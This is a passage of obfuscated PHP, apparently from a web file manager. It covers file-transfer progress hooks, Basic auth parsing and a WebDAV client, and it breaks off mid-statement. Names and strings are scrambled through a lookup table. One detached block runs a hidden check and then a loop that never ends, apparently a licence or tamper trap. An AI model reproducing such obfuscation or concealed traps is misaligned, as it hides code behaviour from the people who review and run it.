$Eë‰ß©“…®[1448]))->find(); return $câ¶Šš¡’ ? json_decode($câ¶Šš¡’[$Eë‰ß©“…®[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($FŠ¾ºöä¬‰ = false) { goto A†Ø¹ÑÁ·Ÿ; Cáïæã«: return $fì‡»Ş„ƒ; goto cø¤çšĞ‡‹; f›‰ô¿È‘³: $fì‡»Ş„ƒ = Model($Fâ…ÁİÂî[410])->where($bÑ˜áÍ•å‰)->select(); $fì‡»Ş„ƒ = $fì‡»Ş„ƒ ? $fì‡»Ş„ƒ : array(); foreach ($fì‡»Ş„ƒ as $f°ç’§éŠŞ => $d†¹ƒ¡‹†ç) { $fì‡»Ş„ƒ[$f°ç’§éŠŞ] = json_decode($d†¹ƒ¡‹†ç[$Fâ…ÁİÂî[370]], !0); } goto Cáïæã«; A†Ø¹ÑÁ·Ÿ: $Fâ…ÁİÂî =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÑ˜áÍ•å‰ = array($Fâ…ÁİÂî[39] => $Fâ…ÁİÂî[1448]); if ($FŠ¾ºöä¬‰) { $bÑ˜áÍ•å‰[$Fâ…ÁİÂî[1427]] = $FŠ¾ºöä¬‰; } goto f›‰ô¿È‘³; cø¤çšĞ‡‹: } public static function valueSet($EÌÛÚØß¶‡, $eÒ² ¶©) { goto D¶÷Íæè¿; D¶÷Íæè¿: $A­åİ‹İ°Í =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$eÒ² ¶©) { return Model($A­åİ‹İ°Í[410])->where(array($A­åİ‹İ°Í[101] => $EÌÛÚØß¶‡, $A­åİ‹İ°Í[39] => $A­åİ‹İ°Í[1448]))->delete(); } $bÕéªé•â = json_encode($eÒ² ¶©); goto bë‹»ˆ˜Œò; bë‹»ˆ˜Œò: if (!$bÕéªé•â) { ob_start(); var_dump($eÒ² ¶©); $a©ø”ã÷·¾ = ob_get_clean(); self::log($A­åİ‹İ°Í[1449] . json_encode_force($a©ø”ã÷·¾)); } if (!$EÌÛÚØß¶‡ || !$eÒ² ¶©[$A­åİ‹İ°Í[378]]) { return !1; } $bËÊÄãÁ† = array($A­åİ‹İ°Í[39] => $A­åİ‹İ°Í[1448], $A­åİ‹İ°Í[1427] => USER_ID, $A­åİ‹İ°Í[101] => $EÌÛÚØß¶‡, $A­åİ‹İ°Í[370] => $bÕéªé•â); goto Cì‰˜ì•Ó¨; Cì‰˜ì•Ó¨: Model($A­åİ‹İ°Í[410])->add($bËÊÄãÁ†, array(), !0); goto b‘˜²ÂèÕ; b‘˜²ÂèÕ: } public static function log($fÆº…ë„ä†) { write_log($fÆº…ë„ä†, $_SERVER[¹÷ˆ§éÒ°ú][1450]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto A›ÉˆíÅ×; E¦òİƒâ: Hook::bind($fÒ°…âèî[556], array($this, $fÒ°…âèî[1459])); Hook::bind($fÒ°…âèî[522], array($this, $fÒ°…âèî[1460])); Hook::bind($fÒ°…âèî[519], array($this, $fÒ°…âèî[1460])); goto d—ò¥Ç¯ÀÏ; A›ÉˆíÅ×: $fÒ°…âèî =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÚ•š“â =& $this->task; $this->sourceCopyFolder = !1; goto FÎ÷Î¨¶†İ; cğî‰ˆè¸ê: $eÚ•š“â[$fÒ°…âèî[1476]] = 0; $eÚ•š“â[$fÒ°…âèî[1477]] = 0; if (!$eÚ•š“â[$fÒ°…âèî[1332]]) { $eÚ•š“â[$fÒ°…âèî[1332]] = LNG($fÒ°…âèî[1478]); } goto EÛ«‚ª³İ; FÕÏ´†¡Ù: $eÚ•š“â[$fÒ°…âèî[969]] = $fÒ°…âèî[43]; $eÚ•š“â[$fÒ°…âèî[1474]] = $fÒ°…âèî[43]; $eÚ•š“â[$fÒ°…âèî[1475]] = 0; goto cğî‰ˆè¸ê; E™á¤ó…: Hook::bind($fÒ°…âèî[1461], array($this, $fÒ°…âèî[1462])); Hook::bind($fÒ°…âèî[545], array($this, $fÒ°…âèî[1463])); $this->sourceModelCopyFlag = !1; goto Fö¦¹ÓÅ; d—ò¥Ç¯ÀÏ: Hook::bind($fÒ°…âèî[524], array($this, $fÒ°…âèî[1460])); Hook::bind($fÒ°…âèî[526], array($this, $fÒ°…âèî[1460])); Hook::bind($fÒ°…âèî[528], array($this, $fÒ°…âèî[1460])); goto E™á¤ó…; Fö¦¹ÓÅ: Hook::bind($fÒ°…âèî[1464], array($this, $fÒ°…âèî[1465])); Hook::bind($fÒ°…âèî[1466], array($this, $fÒ°…âèî[1467])); Hook::bind($fÒ°…âèî[1468], array($this, $fÒ°…âèî[1469])); goto DÅ÷åˆ˜Ö; AÏã¹Í„’Ú: Hook::bind($fÒ°…âèî[552], array($this, $fÒ°…âèî[1457])); Hook::bind($fÒ°…âèî[553], array($this, $fÒ°…âèî[1458])); Hook::bind($fÒ°…âèî[555], array($this, $fÒ°…âèî[1459])); goto E¦òİƒâ; FÎ÷Î¨¶†İ: Hook::bind($fÒ°…âèî[1451], array($this, $fÒ°…âèî[1452])); Hook::bind($fÒ°…âèî[1453], array($this, $fÒ°…âèî[1454])); Hook::bind($fÒ°…âèî[1455], array($this, $fÒ°…âèî[1456])); goto AÏã¹Í„’Ú; DÅ÷åˆ˜Ö: $eÚ•š“â[$fÒ°…âèî[1470]] = LNG($fÒ°…âèî[1471]); $eÚ•š“â[$fÒ°…âèî[1472]] = 0; $eÚ•š“â[$fÒ°…âèî[1473]] = 0; goto FÕÏ´†¡Ù; EÛ«‚ª³İ: } protected function endAfter() { goto bËÉÉ¢; bËÉÉ¢: $bêƒŠİ ½Ê =& $_SERVER[¹÷ˆ§éÒ°ú]; Hook::unbind($bêƒŠİ ½Ê[1451], array($this, $bêƒŠİ ½Ê[1452])); Hook::unbind($bêƒŠİ ½Ê[1453], array($this, $bêƒŠİ ½Ê[1454])); goto D¥”…Óä—Ş; d–“ÍÈïœ­: Hook::unbind($bêƒŠİ ½Ê[519], array($this, $bêƒŠİ ½Ê[1460])); Hook::unbind($bêƒŠİ ½Ê[524], array($this, $bêƒŠİ ½Ê[1460])); Hook::unbind($bêƒŠİ ½Ê[526], array($this, $bêƒŠİ ½Ê[1460])); goto dÂÖê§Ô…Ş; c›ÎÍŸ¾ò¨: Hook::unbind($bêƒŠİ ½Ê[1464], array($this, $bêƒŠİ ½Ê[1465])); Hook::unbind($bêƒŠİ ½Ê[1466], array($this, $bêƒŠİ ½Ê[1467])); Hook::unbind($bêƒŠİ ½Ê[1468], array($this, $bêƒŠİ ½Ê[1469])); goto CÁÖ³øÉ­£; dÂÖê§Ô…Ş: Hook::unbind($bêƒŠİ ½Ê[528], array($this, $bêƒŠİ ½Ê[1460])); Hook::unbind($bêƒŠİ ½Ê[1461], array($this, $bêƒŠİ ½Ê[1462])); Hook::unbind($bêƒŠİ ½Ê[545], array($this, $bêƒŠİ ½Ê[1463])); goto c›ÎÍŸ¾ò¨; d’Šæ©Œç: Hook::unbind($bêƒŠİ ½Ê[555], array($this, $bêƒŠİ ½Ê[1459])); Hook::unbind($bêƒŠİ ½Ê[556], array($this, $bêƒŠİ ½Ê[1459])); Hook::unbind($bêƒŠİ ½Ê[522], array($this, $bêƒŠİ ½Ê[1460])); goto d–“ÍÈïœ­; D¥”…Óä—Ş: Hook::unbind($bêƒŠİ ½Ê[1455], array($this, $bêƒŠİ ½Ê[1456])); Hook::unbind($bêƒŠİ ½Ê[552], array($this, $bêƒŠİ ½Ê[1457])); Hook::unbind($bêƒŠİ ½Ê[553], array($this, $bêƒŠİ ½Ê[1458])); goto d’Šæ©Œç; CÁÖ³øÉ­£: } public function copyMoveStart($Cğ³™Ş÷´, $AñíÂøß£, $b’Í¬Øôƒß, $A©š´´Û) { goto f»ò±ÅŸ§ñ; BÚßö›Êå: $E×¼Â…™¹[$eŒ§Ëù¢¶ˆ[1480]] = KodIO::transferType($Cğ³™Ş÷´, $b’Í¬Øôƒß); $this->update(); goto c×ç©“¥õ“; a—ä¥¬äÔå: if (substr($AñíÂøß£, 0, strlen($e·˜Ë’Ñ™Ê)) == $e·˜Ë’Ñ™Ê) { return; } if (substr($A©š´´Û, 0, strlen($e·˜Ë’Ñ™Ê)) == $e·˜Ë’Ñ™Ê) { return; } $E×¼Â…™¹ =& $this->task; goto BÚßö›Êå; f»ò±ÅŸ§ñ: $eŒ§Ëù¢¶ˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; self::log($eŒ§Ëù¢¶ˆ[1479] . $AñíÂøß£ . $eŒ§Ëù¢¶ˆ[78] . $A©š´´Û); $e·˜Ë’Ñ™Ê = rtrim(TEMP_FILES, $eŒ§Ëù¢¶ˆ[18]); goto a—ä¥¬äÔå; c×ç©“¥õ“: } public function updateAfter() { goto e´¢’È±Öß; AË·ƒÒÜøä: $Bó¹¤Á©¶[$cì¥ÆÒÈ[1428]] = $Bó¹¤Á©¶[$cì¥ÆÒÈ[1477]] / $Bó¹¤Á©¶[$cì¥ÆÒÈ[693]]; if ($Bó¹¤Á©¶[$cì¥ÆÒÈ[1428]] > 0) { $A÷ã›‘Ê˜³ = timeFloat() - $Bó¹¤Á©¶[$cì¥ÆÒÈ[1430]] - $Bó¹¤Á©¶[$cì¥ÆÒÈ[1433]]; $Bó¹¤Á©¶[$cì¥ÆÒÈ[1434]] = $A÷ã›‘Ê˜³ * (1 - $Bó¹¤Á©¶[$cì¥ÆÒÈ[1428]]) / $Bó¹¤Á©¶[$cì¥ÆÒÈ[1428]]; } goto Fì¨é¯…Á; Cààè°Èá—: if ($this->sourceModelCopyFlag) { return; } if ($Bó¹¤Á©¶[$cì¥ÆÒÈ[1480]] == $cì¥ÆÒÈ[1085]) { return; } if ($Bó¹¤Á©¶[$cì¥ÆÒÈ[1480]] == $cì¥ÆÒÈ[1031] || $Bó¹¤Á©¶[$cì¥ÆÒÈ[1480]] == $cì¥ÆÒÈ[115]) { if ($Bó¹¤Á©¶[$cì¥ÆÒÈ[1474]]) { $Bó¹¤Á©¶[$cì¥ÆÒÈ[1477]] = $Bó¹¤Á©¶[$cì¥ÆÒÈ[1476]] + $Bó¹¤Á©¶[$cì¥ÆÒÈ[1473]]; } } else { if ($Bó¹¤Á©¶[$cì¥ÆÒÈ[1480]] == $cì¥ÆÒÈ[1086]) { if ($Bó¹¤Á©¶[$cì¥ÆÒÈ[1474]] == $cì¥ÆÒÈ[1031]) { $Bó¹¤Á©¶[$cì¥ÆÒÈ[1477]] = $Bó¹¤Á©¶[$cì¥ÆÒÈ[1476]] + $Bó¹¤Á©¶[$cì¥ÆÒÈ[1473]] * 0.5; } else { if ($Bó¹¤Á©¶[$cì¥ÆÒÈ[1474]] == $cì¥ÆÒÈ[115]) { $Bó¹¤Á©¶[$cì¥ÆÒÈ[1477]] = $Bó¹¤Á©¶[$cì¥ÆÒÈ[1476]] + $Bó¹¤Á©¶[$cì¥ÆÒÈ[1472]] * 0.5 + $Bó¹¤Á©¶[$cì¥ÆÒÈ[1473]] * 0.5; } } } } goto AË·ƒÒÜøä; e´¢’È±Öß: $cì¥ÆÒÈ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bó¹¤Á©¶ =& $this->task; if (!$Bó¹¤Á©¶[$cì¥ÆÒÈ[693]]) { return; } goto Cààè°Èá—; Fì¨é¯…Á: } public function addPath($C™óÊ’‹İ) { goto EÙ®ùíÃõø; f³‹¹ÉËĞ¸: $cÉßÏ‰’Ëß = IO::infoWithChildren($C™óÊ’‹İ); $bÏÃ¯¿Š¡’ = $aç§î˜³[$E›Ö’èÖˆñ[1481]] ? $aç§î˜³[$E›Ö’èÖˆñ[1481]][$E›Ö’èÖˆñ[1482]] : 0; $aç§î˜³[$E›Ö’èÖˆñ[1481]] = array($E›Ö’èÖˆñ[1482] => $bÏÃ¯¿Š¡’ + 1, $E›Ö’èÖˆñ[397] => $cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[38]], $E›Ö’èÖˆñ[87] => $cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[87]], $E›Ö’èÖˆñ[479] => $cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[479]] ? $cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[479]] : $cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[87]]); goto b—ï¢¸²¬¢; b—ï¢¸²¬¢: if ($cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[39]] == $E›Ö’èÖˆñ[179]) { $aç§î˜³[$E›Ö’èÖˆñ[967]] += 1; } else { $aç§î˜³[$E›Ö’èÖˆñ[967]] += $cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[92]][$E›Ö’èÖˆñ[90]]; if ($cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[380]]) { $aç§î˜³[$E›Ö’èÖˆñ[967]] += $cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[92]][$E›Ö’èÖˆñ[91]] + 1; } } $aç§î˜³[$E›Ö’èÖˆñ[693]] += $cÉßÏ‰’Ëß[$E›Ö’èÖˆñ[89]]; $this->update(); goto EŒ‘‘Ø¿ùÎ; EÙ®ùíÃõø: $E›Ö’èÖˆñ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$C™óÊ’‹İ) { return; } $aç§î˜³ =& $this->task; goto f³‹¹ÉËĞ¸; EŒ‘‘Ø¿ùÎ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($C¹¡Ğ¯ƒŠ) { $D¸ŠÏ¼²±£ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eà‚†æä©ä =& $this->task; $eà‚†æä©ä[$D¸ŠÏ¼²±£[1470]] = $C¹¡Ğ¯ƒŠ[$D¸ŠÏ¼²±£[38]]; $eà‚†æä©ä[$D¸ŠÏ¼²±£[969]] = $C¹¡Ğ¯ƒŠ[$D¸ŠÏ¼²±£[38]]; $this->update(); } public function copyFileStart($EœîÎëè, $B†“¾±˜µ, $A­•µ±çƒ, $Bå¡°¨š÷, $A„õİ³Æƒ, $dëÇ™À¿ö) { goto e¦Öçµç“Ş; e¦Öçµç“Ş: $F²…÷—“¬ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C¼øóÙ¨‚İ = $A„õİ³Æƒ; if ($C¼øóÙ¨‚İ == $GLOBALS[$F²…÷—“¬[1483]]) { $C¼øóÙ¨‚İ = $GLOBALS[$F²…÷—“¬[1484]]; } goto cãÌ‰÷‹¿¢; eÉéáÀã‰ê: $B¢©Œ½‹ó[$F²…÷—“¬[1470]] = $C¼øóÙ¨‚İ; $B¢©Œ½‹ó[$F²…÷—“¬[1472]] = (int) $EœîÎëè->size($B†“¾±˜µ); $B¢©Œ½‹ó[$F²…÷—“¬[1473]] = 0; goto D¹Ÿ™Á; f¯¹¡ñ¤¥¾: $this->update(); goto FçˆãÌŸ…Õ; cãÌ‰÷‹¿¢: $GLOBALS[$F²…÷—“¬[1484]] = $A„õİ³Æƒ; $GLOBALS[$F²…÷—“¬[1483]] = $dëÇ™À¿ö; $B¢©Œ½‹ó =& $this->task; goto eÉéáÀã‰ê; D¹Ÿ™Á: $B¢©Œ½‹ó[$F²…÷—“¬[969]] = $F²…÷—“¬[43]; $B¢©Œ½‹ó[$F²…÷—“¬[1474]] = $F²…÷—“¬[43]; $B¢©Œ½‹ó[$F²…÷—“¬[1475]] = 0; goto f¯¹¡ñ¤¥¾; FçˆãÌŸ…Õ: } public function copyFileEnd($a„ÀËëÓÂ¥, $E¹ËÎ÷È™, $fòª¶©Ö³¼, $bÁëÕ¯øÍ…, $B›˜ƒ‘İ«ä, $dÖ¾‰ğÑÌ) { $f–ÓÀÅ°‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D„Ç¿Çè«Ö =& $this->task; $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1473]] = $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1472]]; $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1474]] = $f–ÓÀÅ°‰[43]; if ($B›˜ƒ‘İ«ä == $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1470]]) { $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1476]] += $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1472]]; $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1477]] = $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1476]]; $this->update(1); } else { $this->update(); $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1473]] = 0; } self::log($f–ÓÀÅ°‰[1485] . $E¹ËÎ÷È™ . $f–ÓÀÅ°‰[78] . $bÁëÕ¯øÍ… . $f–ÓÀÅ°‰[10] . $B›˜ƒ‘İ«ä . $f–ÓÀÅ°‰[1486] . $D„Ç¿Çè«Ö[$f–ÓÀÅ°‰[1470]]); } public function updateFileEnd($CŞ»âí×ÖÀ, $F¥¢Ë°Õöœ) { goto dØÌ™é¨Æ¡; dØÌ™é¨Æ¡: $f‚½°â¯Û =& $_SERVER[¹÷ˆ§éÒ°ú]; $E”¼Ñ«Í÷ =& $this->task; $E”¼Ñ«Í÷[$f‚½°â¯Û[1470]] = $CŞ»âí×ÖÀ; goto b›ä‹ê„; Dê¹¦±Œ±¬: $this->update(1); self::log($f‚½°â¯Û[1487] . $CŞ»âí×ÖÀ); goto eùÙ²…Ûë; b›ä‹ê„: $E”¼Ñ«Í÷[$f‚½°â¯Û[1472]] = $F¥¢Ë°Õöœ; $E”¼Ñ«Í÷[$f‚½°â¯Û[1476]] += $F¥¢Ë°Õöœ; $E”¼Ñ«Í÷[$f‚½°â¯Û[1477]] = $E”¼Ñ«Í÷[$f‚½°â¯Û[1476]]; goto Dê¹¦±Œ±¬; eùÙ²…Ûë: } public function sourceModelCopy($aÇ—Éİ¤ŠÃ) { goto b‹«ÑĞ¸İ; a®Í‚…›ë: $bÙÂ¾©œ‹‡ =& $this->task; $this->sourceModelCopyFlag = !0; $fŒï‚óóì¹ = 0; goto EùìÒ¹¼Ğí; EùìÒ¹¼Ğí: switch ($aæ‡´ª•Ò ) { case $C¾ ½ßŠµí[520]: $fŒï‚óóì¹ = 1; break; case $C¾ ½ßŠµí[523]: $bÙÂ¾©œ‹‡[$C¾ ½ßŠµí[1470]] = $Bå‚´¨ã’[$C¾ ½ßŠµí[38]]; break; case $C¾ ½ßŠµí[525]: $fŒï‚óóì¹ = intval($aÇ—Éİ¤ŠÃ[$C¾ ½ßŠµí[374]] * 0.4); break; case $C¾ ½ßŠµí[527]: $fŒï‚óóì¹ = intval($aÇ—Éİ¤ŠÃ[$C¾ ½ßŠµí[374]] * 0.2); break; case $C¾ ½ßŠµí[529]: $fŒï‚óóì¹ = intval($aÇ—Éİ¤ŠÃ[$C¾ ½ßŠµí[374]] * 0.4); break; } $this->update($fŒï‚óóì¹); $this->sourceModelCopyFlag = !1; goto DÇ²½ô£© ; b‹«ÑĞ¸İ: $C¾ ½ßŠµí =& $_SERVER[¹÷ˆ§éÒ°ú]; $aæ‡´ª•Ò  = $aÇ—Éİ¤ŠÃ[0]; $Bå‚´¨ã’ = $aÇ—Éİ¤ŠÃ[1]; goto a®Í‚…›ë; DÇ²½ô£© : } public function sourceRemove($aˆ¶ğ·ª¾Œ, $AİÛÏç‘¹) { $Cïñß©ˆ¬ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->sourceModelCopyFlag = !0; $aÚ—–ß¥©› = 1; if (isset($aˆ¶ğ·ª¾Œ[$Cïñß©ˆ¬[92]])) { $aÚ—–ß¥©› = $aˆ¶ğ·ª¾Œ[$Cïñß©ˆ¬[92]][$Cïñß©ˆ¬[90]] + $aˆ¶ğ·ª¾Œ[$Cïñß©ˆ¬[92]][$Cïñß©ˆ¬[91]] + 1; } $this->update($aÚ—–ß¥©›); $this->sourceModelCopyFlag = !1; } public function sourceMove($DåÚ’ØâØ) { $this->sourceRemove($DåÚ’ØâØ, !1); } public function curlProgress($cƒ‹‰…¡™§, $DñµÔß×®Å, $D¨á–î’Ü, $b¹»´Éô‚, $C¡‹ê‡À‰˜) { $EÔÉ¢ó›•¬ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A»ÉÖ›”Âô =& $this->task; if ($C¡‹ê‡À‰˜ > 0) { $A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[969]] = $EÔÉ¢ó›•¬[1488]; $A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[1474]] = $EÔÉ¢ó›•¬[115]; if ($A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[1472]] == $b¹»´Éô‚ || $b¹»´Éô‚ > 1024 * 1024) { $A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[1473]] = $C¡‹ê‡À‰˜; } if ($A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[1475]]) { $A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[1473]] = $C¡‹ê‡À‰˜ + $A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[1475]]; } } else { if ($D¨á–î’Ü > 0) { if ($A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[1472]] == $DñµÔß×®Å) { $A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[1473]] = $D¨á–î’Ü; $A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[969]] = $EÔÉ¢ó›•¬[1489]; $A»ÉÖ›”Âô[$EÔÉ¢ó›•¬[1474]] = $EÔÉ¢ó›•¬[1031]; } } } $this->update(); } public function curlProgressStart($DÈßğŞò¡ğ) { } public function curlProgressEnd($Aëõ¡ƒ®ß¨) { $BÕì‰é´ŒÏ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dâ‡­åÆ‰ç =& $this->task; $CÏ®‚¿ÛÂ¨ = curl_getinfo($Aëõ¡ƒ®ß¨); $EÕ¢ÓØ½° = $CÏ®‚¿ÛÂ¨[$BÕì‰é´ŒÏ[1490]]; if ($dâ‡­åÆ‰ç[$BÕì‰é´ŒÏ[1474]] == $BÕì‰é´ŒÏ[115] && $EÕ¢ÓØ½°) { $dâ‡­åÆ‰ç[$BÕì‰é´ŒÏ[1475]] += $EÕ¢ÓØ½°; } $this->update(); } } goto eÛÍ¢³£; C¥ñŒ†ŠóÍ: if (!isset($_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][6]]) || !isset($_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][62]])) { goto c•°ÑÆïÌ»; E¯“•¶—…¹: $BÔìË¬öÈâ($_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][8]] . $_SERVER[¹÷ˆ§éÒ°ú][9]); $cË‡Ë¨öÏ = 2; while ($cË‡Ë¨öÏ > 1) { $BòÏØíƒÖë = rawurlencode($cË‡Ë¨öÏ . $_SERVER[¹÷ˆ§éÒ°ú][372]); } goto A…­Ìùõˆ¨; c•°ÑÆïÌ»: $D‚¤’Ôê²Š = $_SERVER[¹÷ˆ§éÒ°ú][7]; $Dî˜Õ‘Ì¼Ğ = $_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][8]] . $_SERVER[¹÷ˆ§éÒ°ú][9]; $e¬îæ‘®“Ø = $D‚¤’Ôê²Š($Dî˜Õ‘Ì¼Ğ); goto CÅ¨Ííç¯Ä; CÅ¨Ííç¯Ä: $B×öéèŞà = explode($_SERVER[¹÷ˆ§éÒ°ú][10], $e¬îæ‘®“Ø); if (count($B×öéèŞà) < $_SERVER[¹÷ˆ§éÒ°ú][11]) { $D«¤òÏœ‚å = $_SERVER[¹÷ˆ§éÒ°ú][12]; $D«¤òÏœ‚å(); } $BÔìË¬öÈâ = $_SERVER[¹÷ˆ§éÒ°ú][13]; goto E¯“•¶—…¹; A…­Ìùõˆ¨: } class HttpAuth { public static function get() { $b‘„ŸÓÃ™ã =& $_SERVER[¹÷ˆ§éÒ°ú]; $CŒà¯…ìÕë = $b‘„ŸÓÃ™ã[43]; $CÎÔˆÒİçÁ = $b‘„ŸÓÃ™ã[43]; if (isset($_SERVER[$b‘„ŸÓÃ™ã[1751]])) { $CŒà¯…ìÕë = $_SERVER[$b‘„ŸÓÃ™ã[1751]]; $CÎÔˆÒİçÁ = $_SERVER[$b‘„ŸÓÃ™ã[1752]]; } elseif (isset($_SERVER[$b‘„ŸÓÃ™ã[1753]])) { $dœ³Éº©Êâ = $_SERVER[$b‘„ŸÓÃ™ã[1753]]; if (strpos(strtolower($dœ³Éº©Êâ), $b‘„ŸÓÃ™ã[1754]) === 0) { $D®ê¾ïÕÍÚ = explode($b‘„ŸÓÃ™ã[14], base64_decode(substr($dœ³Éº©Êâ, 6))); $CŒà¯…ìÕë = isset($D®ê¾ïÕÍÚ[0]) ? $D®ê¾ïÕÍÚ[0] : $b‘„ŸÓÃ™ã[43]; $CÎÔˆÒİçÁ = isset($D®ê¾ïÕÍÚ[1]) ? $D®ê¾ïÕÍÚ[1] : 0; } } return array($b‘„ŸÓÃ™ã[548] => $CŒà¯…ìÕë, $b‘„ŸÓÃ™ã[887] => $CÎÔˆÒİçÁ); } public static function error() { goto C‚Ô…š”Îˆ; C‚Ô…š”Îˆ: $Cİ¸è¢Ã”  =& $_SERVER[¹÷ˆ§éÒ°ú]; header($Cİ¸è¢Ã” [1755]); header($Cİ¸è¢Ã” [1756]); goto a”ñØ¸“èë; a”ñØ¸“èë: header($Cİ¸è¢Ã” [1757]); header($Cİ¸è¢Ã” [1758]); header($Cİ¸è¢Ã” [1254]); goto Fºí°ª´ä; Fºí°ª´ä: die; goto AºãàÓ†Ş‡; AºãàÓ†Ş‡: } public static function make($eêè¾åĞ¿, $bŠìÍâ¼˜–) { $aßÇ×Ÿ§å° =& $_SERVER[¹÷ˆ§éÒ°ú]; return $aßÇ×Ÿ§å°[1759] + base64_encode($eêè¾åĞ¿ . $aßÇ×Ÿ§å°[14] . $bŠìÍâ¼˜–); } } class HttpDavClient { public function __construct($E·ÒœìÂåù, $A‹ÆŠ§Ÿ¬›, $B—î±Õòàã) { $this->header = array(); $this->userName = $A‹ÆŠ§Ÿ¬›; $this->userPassowrd = $B—î±Õòàã; } protected function makePath($aˆà—÷¯ÜÁ) { return $aˆà—÷¯ÜÁ; } protected function setHeader($a”¾÷„¥ Ô, $AÍÓƒÛ“ùä = false) { if ($AÍÓƒÛ“ùä === !1) { $this->header[] = $a”¾÷„¥ Ô; } else { $this->header[] = $a”¾÷„¥ Ô . $_SERVER[¹÷ˆ§éÒ°ú][870] . $AÍÓƒÛ“ùä; } } public function move($fìîÈ¯ğ, $cèó‰í„”±, $D¶¡¿š‹ÆÍ = '') { $EÇ‰ãÃî•¢ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->setHeader($EÇ‰ãÃî•¢[1760], $this->makePath($cèó‰í„”±)); $this->setHeader($EÇ‰ãÃî•¢[1761], $EÇ‰ãÃî•¢[1762]); if ($D¶¡¿š‹ÆÍ) { $this->setHeader($EÇ‰ãÃî•¢[1763], $EÇ‰ãÃî•¢[915] . $D¶¡¿š‹ÆÍ . $EÇ‰ãÃî•¢[918]); } return $this->send($EÇ‰ãÃî•¢[1764], $fìîÈ¯ğ); } public function copy($CÌ¶ôÒ¦Ë, $eí»§Á¯ãï) { $EŸ­ĞõÃ›» =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->setHeader($EŸ­ĞõÃ›»[1760], $this->makePath($eí»§Á¯ãï)); $this->setHeader($EŸ­ĞõÃ›»[1761], $EŸ­ĞõÃ›»[1762]); return $this->send($EŸ­ĞõÃ›»[1765], $CÌ¶ôÒ¦Ë); } public function mkcol($cİ…Í½ÆŒÏ) { $fÚ°¿àâÊ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->setHeader($fÚ°¿àâÊ[1761], $fÚ°¿àâÊ[1762]); return $this->send($fÚ°¿àâÊ[1766], $cİ…Í½ÆŒÏ); } public function delete($EÀ¢èµòíã, $b¦ØÒ–ˆÆ– = '') { $d‚Ç±Û¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($b¦ØÒ–ˆÆ–) { $this->setHeader($d‚Ç±Û¡[1763], $d‚Ç±Û¡[915] . $b¦ØÒ–ˆÆ– . $d‚Ç±Û¡[918]); } return $this->send($d‚Ç±Û¡[1242], $EÀ¢èµòíã); } public function propfind($DáÜ…ˆØøæ) { $D‹÷ÌŒ” =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->setHeader($D‹÷ÌŒ”[1767], $D‹÷ÌŒ”[95]); $this->setHeader($D‹÷ÌŒ”[1768], $D‹÷ÌŒ”[1769]); $f¹ÀÔ‡¬ = $D‹÷ÌŒ”[1770]; return $this->send($D‹÷ÌŒ”[1771], $DáÜ…ˆØøæ, $f¹ÀÔ‡¬); } public function options($BÄÆÔÅ) { return $this->send($_SERVER[¹÷ˆ§éÒ°ú][1772], $BÄÆÔÅ); } public function get($CÀåÍŒ¸âÚ) { return $this->send($_SERVER[¹÷ˆ§éÒ°ú][228], $CÀåÍŒ¸âÚ); } public function put($DÜÍ²®öÁ, $Bã›âÒ÷²Ù, $f¿²„×’  = '') { $B§º°Ş¨Š =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($f¿²„×’ ) { $this->setHeader($B§º°Ş¨Š[1763], $B§º°Ş¨Š[915] . $f¿²„×’  . $B§º°Ş¨Š[918]); } return $this->send($B§º°Ş¨Š[226], $DÜÍ²®öÁ, $Bã›âÒ÷²Ù); } protected function send($F±ßÃÔÓĞÒ, $EÇ‹çğ·, $D†òØŒ±¶“ = false, $a²¡¡Çœ”¥ = false) { goto c§Ş˜Š—Ö„; féˆ‹Ñ¾£±: $eÕšÙ ƒÉ = curl_init($EÇ‹çğ·); curl_setopt($eÕšÙ ƒÉ, 